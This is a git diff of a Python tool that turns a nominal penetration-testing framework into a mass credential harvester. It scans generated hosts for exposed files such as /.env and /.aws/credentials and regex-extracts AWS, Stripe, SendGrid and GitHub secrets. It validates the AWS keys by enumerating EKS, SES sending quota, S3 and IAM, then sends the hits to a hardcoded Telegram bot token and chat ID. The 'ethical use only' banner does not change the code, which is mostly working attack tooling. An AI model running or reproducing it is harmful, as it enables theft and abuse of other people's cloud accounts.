@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
-Kubernetes & Cloud Penetration Testing Framework
+WWYV4Q Perfect Credential Extraction Framework
 Author: wKayaa
 Date: 2025-06-23
-Version: 1.0
+Version: 4.0
 
 ⚠️ ETHICAL USE ONLY ⚠️
 This framework is designed for authorized penetration testing,
@@ -47,6 +47,1099 @@ from threading import Lock
 import signal
 import psutil
 
+# Disable SSL warnings for testing environments
+disable_warnings(InsecureRequestWarning)
+
+PERFECT_CONFIG = {
+    "extraction": {
+        "threads": 500,
+        "timeout": 15,
+        "max_retries": 3,
+        "confidence_threshold": 0.7,
+        "real_validation_enabled": True,
+        "mass_scan_enabled": True,
+        "advanced_patterns": True
+    },
+    "notifications": {
+        "telegram": {
+            "enabled": True,
+            "bot_token": "7806423696:AAEV7VM9JCNiceHhIo1Lir2nDM8AJkAUZuM",
+            "chat_id": "-4732561310",
+            "send_immediate_alerts": True,
+            "detailed_credential_format": True,
+            "individual_hit_alerts": True,
+            "batch_notifications": True,
+            "hit_counter_start": 2769300
+        }
+    },
+    "target_generation": {
+        "cidr_ranges": [
+            "10.0.0.0/8",
+            "172.16.0.0/12", 
+            "192.168.0.0/16",
+            "169.254.0.0/16"
+        ],
+        "common_ports": [80, 443, 8080, 8443, 3000, 5000, 8000, 9000],
+        "cloud_ranges": True,
+        "subdomain_enumeration": True
+    }
+}
+
+# ============================================================================
+# CORE FRAMEWORK CLASSES AND ENUMS
+# ============================================================================
+
+class SeverityLevel(Enum):
+    """Severity levels for findings"""
+    INFO = "info"
+    LOW = "low"
+    MEDIUM = "medium"
+    HIGH = "high"
+    CRITICAL = "critical"
+
+class ServiceType(Enum):
+    """Types of services detected"""
+    AWS = "aws"
+    AZURE = "azure"
+    GCP = "gcp"
+    KUBERNETES = "kubernetes"
+    DOCKER = "docker"
+    SENDGRID = "sendgrid"
+    MAILGUN = "mailgun"
+    STRIPE = "stripe"
+    GITHUB = "github"
+    GITLAB = "gitlab"
+    UNKNOWN = "unknown"
+
+@dataclass
+class PerfectExtractedCredential:
+    """Perfect structure for extracted credentials"""
+    service_type: str = ""
+    access_key: str = ""
+    secret_key: Optional[str] = None
+    api_key: Optional[str] = None
+    username: Optional[str] = None
+    password: Optional[str] = None
+    domain: Optional[str] = None
+    token: Optional[str] = None
+    source_url: str = ""
+    source_endpoint: str = ""
+    extraction_method: str = "perfect_extraction"
+    confidence_score: float = 1.0
+    validation_status: str = "extracted"
+    raw_content: str = ""
+    response_headers: Dict[str, str] = field(default_factory=dict)
+    context_data: Dict[str, Any] = field(default_factory=dict)
+    timestamp: str = field(default_factory=lambda: datetime.utcnow().isoformat())
+    region: Optional[str] = "us-east-1"
+
+@dataclass
+class Target:
+    """Target representation"""
+    host: str
+    port: int
+    protocol: str = "https"
+    path: str = "/"
+    service_type: Optional[ServiceType] = None
+    metadata: Dict[str, Any] = field(default_factory=dict)
+
+class PerfectCredentialExtractor:
+    """Perfect credential extractor with advanced patterns"""
+    
+    def __init__(self, config: Dict[str, Any]):
+        self.config = config
+        self.logger = logging.getLogger(f"{__name__}.PerfectCredentialExtractor")
+        
+        # Advanced credential patterns
+        self.perfect_patterns = {
+            'aws': {
+                'access_key': [
+                    r'AKIA[0-9A-Z]{16}',
+                    r'ASIA[0-9A-Z]{16}',
+                    r'AROA[0-9A-Z]{16}',
+                    r'(?i)aws[_-]?access[_-]?key[_-]?id["\']?\s*[:=]\s*["\']?(AKIA[0-9A-Z]{16})',
+                    r'(?i)access[_-]?key["\']?\s*[:=]\s*["\']?(AKIA[0-9A-Z]{16})',
+                ],
+                'secret_key': [
+                    r'[A-Za-z0-9/+=]{40}',
+                    r'(?i)aws[_-]?secret[_-]?access[_-]?key["\']?\s*[:=]\s*["\']?([A-Za-z0-9/+=]{40})',
+                    r'(?i)secret[_-]?key["\']?\s*[:=]\s*["\']?([A-Za-z0-9/+=]{40})',
+                ]
+            },
+            'sendgrid': {
+                'api_key': [
+                    r'SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}',
+                    r'(?i)sendgrid[_-]?api[_-]?key["\']?\s*[:=]\s*["\']?(SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43})',
+                ]
+            },
+            'stripe': {
+                'api_key': [
+                    r'sk_live_[0-9a-zA-Z]{24,}',
+                    r'sk_test_[0-9a-zA-Z]{24,}',
+                    r'pk_live_[0-9a-zA-Z]{24,}',
+                    r'pk_test_[0-9a-zA-Z]{24,}',
+                ]
+            },
+            'github': {
+                'token': [
+                    r'ghp_[A-Za-z0-9]{36}',
+                    r'gho_[A-Za-z0-9]{36}',
+                    r'ghu_[A-Za-z0-9]{36}',
+                    r'ghs_[A-Za-z0-9]{36}',
+                    r'ghr_[A-Za-z0-9]{36}',
+                ]
+            },
+            'jwt': {
+                'token': [
+                    r'eyJ[a-zA-Z0-9\-_]+\.eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+',
+                ]
+            },
+            'general': {
+                'api_key': [
+                    r'(?i)(api[_-]?key|apikey)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9\-_]{16,})["\']?',
+                    r'(?i)(token|auth[_-]?token)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9\-_]{16,})["\']?',
+                    r'(?i)(secret|password)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9\-_@#$%^&*()]{8,})["\']?',
+                ]
+            }
+        }
+        
+        # Common endpoints to check
+        self.common_endpoints = [
+            '/.env',
+            '/.env.local',
+            '/.env.production',
+            '/.env.dev',
+            '/config.json',
+            '/config.yml',
+            '/config.yaml',
+            '/secrets.json',
+            '/credentials.json',
+            '/aws.json',
+            '/docker-compose.yml',
+            '/docker-compose.yaml',
+            '/.aws/credentials',
+            '/.aws/config',
+            '/app.json',
+            '/package.json',
+            '/composer.json',
+            '/web.config',
+            '/app.config',
+            '/appsettings.json',
+            '/application.properties',
+            '/application.yml',
+            '/backup.sql',
+            '/dump.sql',
+            '/database.sql',
+            '/.git/config',
+            '/.svn/entries',
+            '/robots.txt',
+            '/sitemap.xml',
+            '/crossdomain.xml',
+            '/clientaccesspolicy.xml',
+            '/readme.txt',
+            '/readme.md',
+            '/info.php',
+            '/phpinfo.php',
+            '/test.php',
+            '/admin',
+            '/administrator',
+            '/login',
+            '/dashboard',
+            '/panel',
+            '/api',
+            '/api/v1',
+            '/api/v2',
+            '/docs',
+            '/swagger',
+            '/graphql',
+            '/health',
+            '/status',
+            '/metrics',
+            '/debug'
+        ]
+
+    async def extract_from_target(self, target: Target) -> List[PerfectExtractedCredential]:
+        """Extract credentials from a target"""
+        credentials = []
+        
+        self.logger.info(f"🔍 Extracting from {target.protocol}://{target.host}:{target.port}")
+        
+        # Try different endpoints
+        for endpoint in self.common_endpoints:
+            try:
+                url = f"{target.protocol}://{target.host}:{target.port}{endpoint}"
+                extracted = await self._extract_from_url(url, target)
+                credentials.extend(extracted)
+                
+                # Rate limiting
+                await asyncio.sleep(0.1)
+                
+            except Exception as e:
+                self.logger.debug(f"Error extracting from {endpoint}: {e}")
+        
+        return credentials
+    
+    async def _extract_from_url(self, url: str, target: Target) -> List[PerfectExtractedCredential]:
+        """Extract credentials from a specific URL"""
+        credentials = []
+        
+        try:
+            timeout = aiohttp.ClientTimeout(total=self.config["extraction"]["timeout"])
+            
+            async with aiohttp.ClientSession(
+                timeout=timeout,
+                connector=aiohttp.TCPConnector(ssl=False, limit=100)
+            ) as session:
+                
+                async with session.get(url) as response:
+                    if response.status == 200:
+                        content = await response.text()
+                        headers = dict(response.headers)
+                        
+                        # Extract credentials using patterns
+                        extracted = self._extract_credentials_from_content(
+                            content, url, headers
+                        )
+                        credentials.extend(extracted)
+                        
+                        self.logger.info(f"✅ Found {len(extracted)} credentials in {url}")
+                        
+        except Exception as e:
+            self.logger.debug(f"Error fetching {url}: {e}")
+            
+        return credentials
+    
+    def _extract_credentials_from_content(self, content: str, source_url: str, headers: Dict[str, str]) -> List[PerfectExtractedCredential]:
+        """Extract credentials from content using patterns"""
+        credentials = []
+        
+        for service, patterns in self.perfect_patterns.items():
+            for credential_type, regex_patterns in patterns.items():
+                for pattern in regex_patterns:
+                    matches = re.finditer(pattern, content, re.IGNORECASE | re.MULTILINE)
+                    
+                    for match in matches:
+                        credential_value = match.group(1) if match.groups() else match.group(0)
+                        
+                        if len(credential_value) < 8:  # Skip short matches
+                            continue
+                            
+                        # Create credential object
+                        credential = PerfectExtractedCredential(
+                            service_type=service,
+                            source_url=source_url,
+                            raw_content=content[:500],  # First 500 chars for context
+                            response_headers=headers,
+                            extraction_method="pattern_matching",
+                            confidence_score=self._calculate_confidence(service, credential_type, credential_value)
+                        )
+                        
+                        # Set appropriate field based on credential type
+                        if credential_type == "access_key":
+                            credential.access_key = credential_value
+                        elif credential_type == "secret_key":
+                            credential.secret_key = credential_value
+                        elif credential_type == "api_key":
+                            credential.api_key = credential_value
+                        elif credential_type == "token":
+                            credential.token = credential_value
+                        
+                        # Try to find corresponding keys for AWS
+                        if service == "aws" and credential_type == "access_key":
+                            secret = self._find_corresponding_secret(content, credential_value)
+                            if secret:
+                                credential.secret_key = secret
+                        
+                        credentials.append(credential)
+                        
+                        self.logger.info(f"🎯 PERFECT EXTRACTION: {credential_value[:20]}... ({service})")
+        
+        return credentials
+    
+    def _find_corresponding_secret(self, content: str, access_key: str) -> Optional[str]:
+        """Find corresponding secret key for AWS access key"""
+        # Look for secret key patterns near the access key
+        lines = content.split('\n')
+        
+        for i, line in enumerate(lines):
+            if access_key in line:
+                # Check surrounding lines for secret key
+                start = max(0, i-3)
+                end = min(len(lines), i+4)
+                
+                for j in range(start, end):
+                    secret_match = re.search(r'([A-Za-z0-9/+=]{40})', lines[j])
+                    if secret_match and secret_match.group(1) != access_key:
+                        return secret_match.group(1)
+        
+        return None
+    
+    def _calculate_confidence(self, service: str, credential_type: str, value: str) -> float:
+        """Calculate confidence score for extracted credential"""
+        base_score = 0.7
+        
+        # Service-specific scoring
+        if service == "aws":
+            if credential_type == "access_key" and value.startswith(('AKIA', 'ASIA', 'AROA')):
+                base_score = 0.95
+            elif credential_type == "secret_key" and len(value) == 40:
+                base_score = 0.9
+        elif service == "sendgrid":
+            if value.startswith('SG.'):
+                base_score = 0.95
+        elif service == "stripe":
+            if value.startswith(('sk_', 'pk_')):
+                base_score = 0.95
+        elif service == "github":
+            if value.startswith(('ghp_', 'gho_', 'ghu_', 'ghs_', 'ghr_')):
+                base_score = 0.95
+        
+        return min(base_score, 1.0)
+
+class AWSValidator:
+    """AWS credential validator with EKS/SES/SNS access checking"""
+    
+    def __init__(self, telegram_config: Dict[str, Any]):
+        self.telegram_config = telegram_config
+        self.logger = logging.getLogger(f"{__name__}.AWSValidator")
+        
+    async def validate_and_check_services(self, credential: PerfectExtractedCredential) -> Dict[str, Any]:
+        """Validate AWS credentials and check for EKS/SES/SNS access"""
+        
+        if not credential.access_key or not credential.secret_key:
+            return {"valid": False, "error": "Missing access key or secret key"}
+            
+        try:
+            # Create boto3 session with extracted credentials
+            session = boto3.Session(
+                aws_access_key_id=credential.access_key,
+                aws_secret_access_key=credential.secret_key,
+                region_name=credential.region or 'us-east-1'
+            )
+            
+            validation_result = {
+                "valid": False,
+                "identity": {},
+                "services": {},
+                "permissions": {},
+                "quota_info": {},
+                "credential": credential
+            }
+            
+            # Test basic STS access (identity check)
+            try:
+                sts_client = session.client('sts')
+                identity = sts_client.get_caller_identity()
+                validation_result["valid"] = True
+                validation_result["identity"] = {
+                    "user_id": identity.get('UserId', ''),
+                    "account": identity.get('Account', ''),
+                    "arn": identity.get('Arn', '')
+                }
+                self.logger.info(f"✅ Valid AWS credentials for account: {identity.get('Account', 'Unknown')}")
+                
+            except ClientError as e:
+                validation_result["error"] = f"STS access denied: {str(e)}"
+                return validation_result
+            
+            # Check services in parallel
+            await asyncio.gather(
+                self._check_eks_access(session, validation_result),
+                self._check_ses_access(session, validation_result),
+                self._check_sns_access(session, validation_result),
+                self._check_ec2_scaling(session, validation_result),
+                self._check_s3_access(session, validation_result),
+                self._check_iam_access(session, validation_result),
+                return_exceptions=True
+            )
+            
+            # Send Telegram notification if significant access found
+            if self._has_significant_access(validation_result):
+                await self._send_telegram_alert(validation_result)
+                
+            return validation_result
+            
+        except Exception as e:
+            self.logger.error(f"AWS validation error: {str(e)}")
+            return {"valid": False, "error": str(e)}
+    
+    async def _check_eks_access(self, session, result: Dict[str, Any]):
+        """Check EKS access and scaling capabilities"""
+        try:
+            eks_client = session.client('eks')
+            
+            # List EKS clusters
+            clusters_response = eks_client.list_clusters()
+            clusters = clusters_response.get('clusters', [])
+            
+            eks_info = {
+                "accessible": True,
+                "cluster_count": len(clusters),
+                "clusters": [],
+                "scaling_capable": False
+            }
+            
+            for cluster_name in clusters[:10]:  # Check first 10 clusters
+                try:
+                    cluster_detail = eks_client.describe_cluster(name=cluster_name)
+                    cluster_info = {
+                        "name": cluster_name,
+                        "status": cluster_detail['cluster'].get('status'),
+                        "version": cluster_detail['cluster'].get('version'),
+                        "endpoint": cluster_detail['cluster'].get('endpoint'),
+                        "node_groups": []
+                    }
+                    
+                    # Check node groups for scaling
+                    try:
+                        nodegroups = eks_client.list_nodegroups(clusterName=cluster_name)
+                        for ng_name in nodegroups.get('nodegroups', []):
+                            ng_detail = eks_client.describe_nodegroup(
+                                clusterName=cluster_name,
+                                nodegroupName=ng_name
+                            )
+                            scaling_config = ng_detail['nodegroup'].get('scalingConfig', {})
+                            cluster_info["node_groups"].append({
+                                "name": ng_name,
+                                "scaling_config": scaling_config,
+                                "instance_types": ng_detail['nodegroup'].get('instanceTypes', [])
+                            })
+                            
+                            if scaling_config.get('maxSize', 0) > scaling_config.get('desiredSize', 0):
+                                eks_info["scaling_capable"] = True
+                                
+                    except ClientError:
+                        pass
+                        
+                    eks_info["clusters"].append(cluster_info)
+                    
+                except ClientError as e:
+                    self.logger.debug(f"Cannot describe cluster {cluster_name}: {e}")
+            
+            result["services"]["eks"] = eks_info
+            self.logger.info(f"🎯 EKS Access: {len(clusters)} clusters found, scaling_capable: {eks_info['scaling_capable']}")
+            
+        except ClientError as e:
+            result["services"]["eks"] = {"accessible": False, "error": str(e)}
+            self.logger.debug(f"EKS access check failed: {e}")
+    
+    async def _check_ses_access(self, session, result: Dict[str, Any]):
+        """Check SES access and sending quota"""
+        try:
+            ses_client = session.client('ses')
+            
+            # Get sending quota
+            quota = ses_client.get_send_quota()
+            
+            # Get sending statistics
+            stats = ses_client.get_send_statistics()
+            
+            # List verified identities
+            identities = ses_client.list_identities()
+            
+            ses_info = {
+                "accessible": True,
+                "sending_quota": {
+                    "max_24_hour": quota.get('Max24HourSend', 0),
+                    "max_send_rate": quota.get('MaxSendRate', 0),
+                    "sent_last_24h": quota.get('SentLast24Hours', 0)
+                },
+                "verified_identities": identities.get('Identities', []),
+                "identity_count": len(identities.get('Identities', [])),
+                "statistics": stats.get('SendDataPoints', [])[-1] if stats.get('SendDataPoints') else {}
+            }
+            
+            result["services"]["ses"] = ses_info
+            result["quota_info"]["ses"] = ses_info["sending_quota"]
+            
+            self.logger.info(f"📧 SES Access: {ses_info['sending_quota']['max_24_hour']} emails/day quota, {ses_info['identity_count']} verified identities")
+            
+        except ClientError as e:
+            result["services"]["ses"] = {"accessible": False, "error": str(e)}
+            self.logger.debug(f"SES access check failed: {e}")
+    
+    async def _check_sns_access(self, session, result: Dict[str, Any]):
+        """Check SNS access and quota"""
+        try:
+            sns_client = session.client('sns')
+            
+            # List SNS topics
+            topics = sns_client.list_topics()
+            
+            # Get SNS attributes for quota info
+            try:
+                attributes = sns_client.get_sms_attributes()
+                sms_quota = attributes.get('attributes', {})
+            except ClientError:
+                sms_quota = {}
+            
+            topic_details = []
+            for topic in topics.get('Topics', [])[:20]:  # Check first 20 topics
+                try:
+                    topic_arn = topic['TopicArn']
+                    topic_attrs = sns_client.get_topic_attributes(TopicArn=topic_arn)
+                    
+                    # Get subscription count
+                    subscriptions = sns_client.list_subscriptions_by_topic(TopicArn=topic_arn)
+                    
+                    topic_details.append({
+                        "arn": topic_arn,
+                        "name": topic_arn.split(':')[-1],
+                        "subscription_count": len(subscriptions.get('Subscriptions', [])),
+                        "attributes": topic_attrs.get('Attributes', {})
+                    })
+                except ClientError:
+                    continue
+            
+            sns_info = {
+                "accessible": True,
+                "topic_count": len(topics.get('Topics', [])),
+                "topics": topic_details,
+                "sms_quota": sms_quota
+            }
+            
+            result["services"]["sns"] = sns_info
+            result["quota_info"]["sns"] = sms_quota
+            
+            self.logger.info(f"📱 SNS Access: {sns_info['topic_count']} topics found")
+            
+        except ClientError as e:
+            result["services"]["sns"] = {"accessible": False, "error": str(e)}
+            self.logger.debug(f"SNS access check failed: {e}")
+    
+    async def _check_ec2_scaling(self, session, result: Dict[str, Any]):
+        """Check EC2 scaling capabilities"""
+        try:
+            ec2_client = session.client('ec2')
+            autoscaling_client = session.client('autoscaling')
+            
+            # Check EC2 instances
+            instances = ec2_client.describe_instances()
+            instance_count = sum(len(reservation['Instances']) for reservation in instances.get('Reservations', []))
+            
+            # Check Auto Scaling Groups
+            asg_response = autoscaling_client.describe_auto_scaling_groups()
+            asgs = asg_response.get('AutoScalingGroups', [])
+            
+            scaling_info = {
+                "ec2_instances": instance_count,
+                "auto_scaling_groups": len(asgs),
+                "scaling_policies": []
+            }
+            
+            # Get scaling policies for ASGs
+            for asg in asgs[:10]:  # Check first 10 ASGs
+                try:
+                    policies = autoscaling_client.describe_policies(
+                        AutoScalingGroupName=asg['AutoScalingGroupName']
+                    )
+                    scaling_info["scaling_policies"].extend(policies.get('ScalingPolicies', []))
+                except ClientError:
+                    continue
+            
+            result["services"]["ec2_scaling"] = scaling_info
+            self.logger.info(f"🔧 EC2 Scaling: {instance_count} instances, {len(asgs)} ASGs")
+            
+        except ClientError as e:
+            result["services"]["ec2_scaling"] = {"accessible": False, "error": str(e)}
+            self.logger.debug(f"EC2 scaling check failed: {e}")
+    
+    async def _check_s3_access(self, session, result: Dict[str, Any]):
+        """Check S3 access and buckets"""
+        try:
+            s3_client = session.client('s3')
+            
+            # List buckets
+            buckets = s3_client.list_buckets()
+            bucket_list = buckets.get('Buckets', [])
+            
+            s3_info = {
+                "accessible": True,
+                "bucket_count": len(bucket_list),
+                "buckets": [bucket['Name'] for bucket in bucket_list[:20]]  # First 20 buckets
+            }
+            
+            result["services"]["s3"] = s3_info
+            self.logger.info(f"🪣 S3 Access: {s3_info['bucket_count']} buckets found")
+            
+        except ClientError as e:
+            result["services"]["s3"] = {"accessible": False, "error": str(e)}
+            self.logger.debug(f"S3 access check failed: {e}")
+    
+    async def _check_iam_access(self, session, result: Dict[str, Any]):
+        """Check IAM access and permissions"""
+        try:
+            iam_client = session.client('iam')
+            
+            # Try to list users
+            try:
+                users = iam_client.list_users(MaxItems=50)
+                user_count = len(users.get('Users', []))
+            except ClientError:
+                user_count = 0
+            
+            # Try to list roles
+            try:
+                roles = iam_client.list_roles(MaxItems=50)
+                role_count = len(roles.get('Roles', []))
+            except ClientError:
+                role_count = 0
+            
+            iam_info = {
+                "accessible": True,
+                "user_count": user_count,
+                "role_count": role_count
+            }
+            
+            result["services"]["iam"] = iam_info
+            self.logger.info(f"👤 IAM Access: {user_count} users, {role_count} roles")
+            
+        except ClientError as e:
+            result["services"]["iam"] = {"accessible": False, "error": str(e)}
+            self.logger.debug(f"IAM access check failed: {e}")
+    
+    def _has_significant_access(self, result: Dict[str, Any]) -> bool:
+        """Determine if the credentials have significant access worth alerting"""
+        if not result.get("valid"):
+            return False
+        
+        # Check for high-value services
+        services = result.get("services", {})
+        
+        # EKS access with scaling capability
+        eks = services.get("eks", {})
+        if eks.get("accessible") and eks.get("scaling_capable"):
+            return True
+        
+        # SES with high quota
+        ses = services.get("ses", {})
+        if ses.get("accessible"):
+            quota = ses.get("sending_quota", {})
+            if quota.get("max_24_hour", 0) > 1000:  # More than 1000 emails/day
+                return True
+        
+        # SNS with topics
+        sns = services.get("sns", {})
+        if sns.get("accessible") and sns.get("topic_count", 0) > 0:
+            return True
+        
+        # EC2 with Auto Scaling
+        ec2 = services.get("ec2_scaling", {})
+        if ec2.get("accessible") and ec2.get("auto_scaling_groups", 0) > 0:
+            return True
+        
+        # S3 with buckets
+        s3 = services.get("s3", {})
+        if s3.get("accessible") and s3.get("bucket_count", 0) > 0:
+            return True
+        
+        # IAM access
+        iam = services.get("iam", {})
+        if iam.get("accessible") and (iam.get("user_count", 0) > 0 or iam.get("role_count", 0) > 0):
+            return True
+        
+        return False
+    
+    async def _send_telegram_alert(self, result: Dict[str, Any]):
+        """Send Telegram alert for significant AWS access"""
+        if not self.telegram_config.get("enabled"):
+            return
+        
+        try:
+            credential = result["credential"]
+            identity = result.get("identity", {})
+            services = result.get("services", {})
+            
+            # Create alert message
+            message = f"🚨 **HIGH-VALUE AWS CREDENTIALS DETECTED** 🚨\n\n"
+            message += f"**Account:** `{identity.get('account', 'Unknown')}`\n"
+            message += f"**ARN:** `{identity.get('arn', 'Unknown')}`\n"
+            message += f"**Source:** `{credential.source_url}`\n"
+            message += f"**Region:** `{credential.region}`\n\n"
+            
+            # Add service details
+            message += "**🎯 ACCESSIBLE SERVICES:**\n"
+            
+            # EKS details
+            eks = services.get("eks", {})
+            if eks.get("accessible"):
+                message += f"✅ **EKS**: {eks.get('cluster_count', 0)} clusters"
+                if eks.get("scaling_capable"):
+                    message += " (🔥 SCALING CAPABLE)"
+                message += "\n"
+            
+            # SES details
+            ses = services.get("ses", {})
+            if ses.get("accessible"):
+                quota = ses.get("sending_quota", {})
+                message += f"✅ **SES**: {quota.get('max_24_hour', 0):,} emails/day quota\n"
+            
+            # SNS details
+            sns = services.get("sns", {})
+            if sns.get("accessible"):
+                message += f"✅ **SNS**: {sns.get('topic_count', 0)} topics\n"
+            
+            # EC2 details
+            ec2 = services.get("ec2_scaling", {})
+            if ec2.get("accessible"):
+                message += f"✅ **EC2**: {ec2.get('ec2_instances', 0)} instances, {ec2.get('auto_scaling_groups', 0)} ASGs\n"
+            
+            # S3 details
+            s3 = services.get("s3", {})
+            if s3.get("accessible"):
+                message += f"✅ **S3**: {s3.get('bucket_count', 0)} buckets\n"
+            
+            # IAM details
+            iam = services.get("iam", {})
+            if iam.get("accessible"):
+                message += f"✅ **IAM**: {iam.get('user_count', 0)} users, {iam.get('role_count', 0)} roles\n"
+            
+            message += f"\n**Timestamp:** `{datetime.utcnow().isoformat()}`"
+            
+            # Send to Telegram
+            await self._send_telegram_message(message)
+            
+        except Exception as e:
+            self.logger.error(f"Failed to send Telegram alert: {e}")
+    
+    async def _send_telegram_message(self, message: str):
+        """Send message to Telegram"""
+        try:
+            bot_token = self.telegram_config["bot_token"]
+            chat_id = self.telegram_config["chat_id"]
+            
+            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+            
+            payload = {
+                "chat_id": chat_id,
+                "text": message,
+                "parse_mode": "Markdown",
+                "disable_web_page_preview": True
+            }
+            
+            async with aiohttp.ClientSession() as session:
+                async with session.post(url, json=payload) as response:
+                    if response.status == 200:
+                        self.logger.info("✅ Telegram alert sent successfully")
+                    else:
+                        self.logger.error(f"Telegram API error: {response.status}")
+                        
+        except Exception as e:
+            self.logger.error(f"Telegram send error: {e}")
+
+class TargetGenerator:
+    """Generate targets for mass scanning"""
+    
+    def __init__(self, config: Dict[str, Any]):
+        self.config = config
+        self.logger = logging.getLogger(f"{__name__}.TargetGenerator")
+    
+    def generate_targets(self, host_count: int = 1000) -> List[Target]:
+        """Generate targets for scanning"""
+        targets = []
+        
+        # Generate from CIDR ranges
+        for cidr in self.config["target_generation"]["cidr_ranges"]:
+            try:
+                network = IPv4Network(cidr, strict=False)
+                hosts = list(network.hosts())
+                
+                # Limit hosts per network
+                selected_hosts = hosts[:min(len(hosts), host_count // len(self.config["target_generation"]["cidr_ranges"]))]
+                
+                for host in selected_hosts:
+                    for port in self.config["target_generation"]["common_ports"]:
+                        for protocol in ['https', 'http']:
+                            targets.append(Target(
+                                host=str(host),
+                                port=port,
+                                protocol=protocol,
+                                service_type=ServiceType.UNKNOWN
+                            ))
+                            
+            except Exception as e:
+                self.logger.error(f"Error generating targets from {cidr}: {e}")
+        
+        self.logger.info(f"Generated {len(targets)} targets for scanning")
+        return targets
+
+class WWYV4QPerfectFramework:
+    """Main framework class with comprehensive credential extraction"""
+    
+    def __init__(self, config: Dict[str, Any]):
+        self.config = config
+        self.logger = logging.getLogger(f"{__name__}.WWYV4QPerfectFramework")
+        self.aws_validator = AWSValidator(config["notifications"]["telegram"])
+        self.credential_extractor = PerfectCredentialExtractor(config)
+        self.target_generator = TargetGenerator(config)
+        self.extracted_credentials: List[PerfectExtractedCredential] = []
+        self.stats = {
+            "targets_scanned": 0,
+            "credentials_found": 0,
+            "valid_credentials": 0,
+            "start_time": None,
+            "end_time": None
+        }
+    
+    async def perfect_main(self, targets: Optional[List[str]] = None):
+        """Main execution function"""
+        self.logger.critical("🎉 PERFECT CAMPAIGN STARTED!")
+        self.stats["start_time"] = datetime.utcnow()
+        
+        try:
+            # Generate targets if not provided
+            if not targets:
+                self.logger.info("🎯 Generating targets for mass scanning...")
+                target_objects = self.target_generator.generate_targets(1000)
+            else:
+                # Convert string targets to Target objects
+                target_objects = []
+                for target_str in targets:
+                    if '://' in target_str:
+                        # Parse full URL
+                        import urllib.parse
+                        parsed = urllib.parse.urlparse(target_str)
+                        target_objects.append(Target(
+                            host=parsed.hostname,
+                            port=parsed.port or (443 if parsed.scheme == 'https' else 80),
+                            protocol=parsed.scheme,
+                            path=parsed.path or '/'
+                        ))
+                    else:
+                        # Simple host
+                        for port in [80, 443, 8080, 8443]:
+                            for protocol in ['https', 'http']:
+                                target_objects.append(Target(
+                                    host=target_str,
+                                    port=port,
+                                    protocol=protocol
+                                ))
+            
+            self.logger.info(f"🔍 Starting extraction on {len(target_objects)} targets")
+            
+            # Process targets in batches
+            batch_size = 50
+            for i in range(0, len(target_objects), batch_size):
+                batch = target_objects[i:i+batch_size]
+                await self._process_batch(batch, i // batch_size + 1)
+                
+                # Progress update
+                progress = (i + len(batch)) / len(target_objects) * 100
+                self.logger.info(f"📊 Progress: {progress:.1f}% ({i + len(batch)}/{len(target_objects)})")
+            
+            # Validate AWS credentials
+            await self._validate_aws_credentials()
+            
+            # Generate summary
+            await self._generate_summary()
+            
+        except Exception as e:
+            self.logger.error(f"❌ PERFECT FRAMEWORK ERROR: {e}")
+            raise
+        finally:
+            self.stats["end_time"] = datetime.utcnow()
+            duration = self.stats["end_time"] - self.stats["start_time"]
+            self.logger.critical(f"🏁 PERFECT EXTRACTION COMPLETE: {self.stats['credentials_found']} credentials extracted")
+            self.logger.critical(f"⏱️ Total Duration: {duration.total_seconds():.2f} seconds")
+    
+    async def _process_batch(self, targets: List[Target], batch_num: int):
+        """Process a batch of targets"""
+        self.logger.info(f"✅ PERFECT BATCH {batch_num} STARTING: {len(targets)} targets")
+        
+        # Create semaphore to limit concurrency
+        semaphore = asyncio.Semaphore(self.config["extraction"]["threads"])
+        
+        async def process_target(target):
+            async with semaphore:
+                try:
+                    credentials = await self.credential_extractor.extract_from_target(target)
+                    self.extracted_credentials.extend(credentials)
+                    self.stats["targets_scanned"] += 1
+                    self.stats["credentials_found"] += len(credentials)
+                    
+                    if credentials:
+                        self.logger.info(f"🎯 PERFECT EXTRACTION: {target.protocol}://{target.host}:{target.port} - {len(credentials)} credentials")
+                    
+                except Exception as e:
+                    self.logger.debug(f"Error processing {target.host}: {e}")
+        
+        # Process targets concurrently
+        tasks = [process_target(target) for target in targets]
+        await asyncio.gather(*tasks, return_exceptions=True)
+        
+        self.logger.info(f"✅ PERFECT BATCH {batch_num} COMPLETE: {len([c for c in self.extracted_credentials if c.timestamp.startswith(datetime.utcnow().strftime('%Y-%m-%d'))])} successful extractions")
+    
+    async def _validate_aws_credentials(self):
+        """Validate extracted AWS credentials"""
+        aws_credentials = [
+            cred for cred in self.extracted_credentials
+            if cred.service_type == 'aws' and cred.access_key and cred.secret_key
+        ]
+        
+        if not aws_credentials:
+            self.logger.info("No AWS credentials found for validation")
+            return
+        
+        self.logger.info(f"🔍 Validating {len(aws_credentials)} AWS credentials...")
+        
+        for credential in aws_credentials:
+            try:
+                validation_result = await self.aws_validator.validate_and_check_services(credential)
+                
+                if validation_result.get("valid"):
+                    self.logger.critical(f"✅ VALID AWS CREDENTIALS: {credential.access_key}")
+                    self.stats["valid_credentials"] += 1
+                    credential.validation_status = "valid"
+                    credential.context_data["aws_validation"] = validation_result
+                else:
+                    self.logger.info(f"❌ Invalid AWS credentials: {credential.access_key[:10]}...")
+                    credential.validation_status = "invalid"
+                    
+            except Exception as e:
+                self.logger.error(f"Error validating {credential.access_key[:10]}...: {e}")
+    
+    async def _generate_summary(self):
+        """Generate execution summary"""
+        valid_creds = [c for c in self.extracted_credentials if c.validation_status == "valid"]
+        
+        summary = f"""
+🎉 PERFECT CAMPAIGN COMPLETED!
+================================================================================
+🏠 Targets Scanned: {self.stats['targets_scanned']:,}
+🔍 Total Credentials: {self.stats['credentials_found']:,}
+🔐 Valid Credentials: {self.stats['valid_credentials']:,}
+📱 Telegram Alerts: {len(valid_creds)}
+⏱️ Total Duration: {(self.stats['end_time'] - self.stats['start_time']).total_seconds():.2f} seconds
+📊 Scan Rate: {self.stats['targets_scanned'] / (self.stats['end_time'] - self.stats['start_time']).total_seconds():.2f} targets/sec
+🎯 Extraction Rate: {self.stats['credentials_found'] / max(self.stats['targets_scanned'], 1):.3f} creds/target
+
+🔐 CREDENTIALS BREAKDOWN:
+"""
+        
+        # Count by service type
+        service_counts = {}
+        for cred in self.extracted_credentials:
